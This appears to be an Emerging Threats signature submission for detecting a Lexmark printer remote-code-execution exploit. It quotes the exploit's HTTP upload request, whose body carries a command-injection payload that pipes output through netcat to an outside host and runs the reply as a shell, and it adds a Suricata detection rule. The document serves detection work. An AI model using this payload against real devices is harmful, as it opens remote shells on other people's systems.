# ET Open Submission
### January 25th, 2023
### Lexmark RCE Exploit Detected


## Resources

1. https://github.com/blasty/lexmark

Lexmark RCE 0-Day as of January 10th, 2023

Without an actual Lexmark printer I am making some assumptions but the initial POST is mostly all I needed to confirm this wasn't previously being detected and can be detected based on it.

Below is the initial POST from the exploit given by blasty.

```POST /webglue/uploadfile/ImportFaxLogo HTTP/1.1
Host: 192.168.2.1
User-Agent: python-requests/2.27.1
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 188
Content-Type: multipart/form-data; boundary=be74f00990243272ae1a2528f31c16e0

--be74f00990243272ae1a2528f31c16e0
Content-Disposition: form-data; name="x"; filename="x"

lol;";sh /tmp/xyz # "; id | nc 192.168.2.29 1912 | sh # 
--be74f00990243272ae1a2528f31c16e0--
```

I generated a Flowsynth PCAP from this info. [Download it here](flowsynth.pcap)

## Signature

```alert http $EXTERNAL_NET any -> $HOME_NET any msg:"ET Exploit (Lexmark Malicious File Upload Detected)"; flow:established,to_server; http.method; content:"POST"; bsize:4; http.uri; content:"/webglue/uploadfile/ImportFaxLogo"; bsize:33; fast_pattern; http.request_body; content:"Content-Disposition:"; nocase; content:"name="; nocase; content:"filename="; nocase; within:255; pcre:"/(?:[\x60\x3b\x7c\x26]|%60|%3b|%7c|%26|(?:[\x3c\x3e\x24]|%3c|%3e|%24)(?:\x28|%28))/Ri"; reference:url,https://github.com/blasty/lexmark; classtype:exploit-activity; sid:1; rev:1;)```

This link **should** last for 30 days. If not, just use the pcap to recreate it.

[Dalton Job ID](https://dalton.centraliowacybersec.com/dalton/coverage/job/1ac0f73a37a2378e)

## Downloads

[Flowsynth PCAP](flowsynth.pcap)
